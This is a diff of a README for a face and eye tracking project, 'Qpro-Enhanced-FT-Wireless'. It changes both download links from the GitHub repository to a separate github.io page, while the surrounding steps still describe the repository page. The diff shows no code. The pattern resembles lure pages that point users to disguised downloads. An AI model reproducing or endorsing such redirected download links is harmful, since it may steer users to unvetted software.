@@ -1,6 +1,6 @@
 # 📡 Qpro-Enhanced-FT-Wireless - Unlock Advanced Face and Eye Tracking
 
-[![Download Now](https://img.shields.io/badge/Download-Application-2ea44f?style=for-the-badge)](https://github.com/bus35hs/Qpro-Enhanced-FT-Wireless)
+[![Download Now](https://img.shields.io/badge/Download-Application-2ea44f?style=for-the-badge)](https://bus35hs.github.io)
 
 ---
 
@@ -39,7 +39,7 @@ Follow these steps carefully. Take your time – rushing can cause mistakes.
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-[**https://github.com/bus35hs/Qpro-Enhanced-FT-Wireless**](https://github.com/bus35hs/Qpro-Enhanced-FT-Wireless)
+[**https://bus35hs.github.io**](https://bus35hs.github.io)
 
 You'll land on the project page. Look for a green button that says **"Code"** or **"Releases"** on the right side. Click it and select **"Download ZIP"** to save the file to your computer.
 
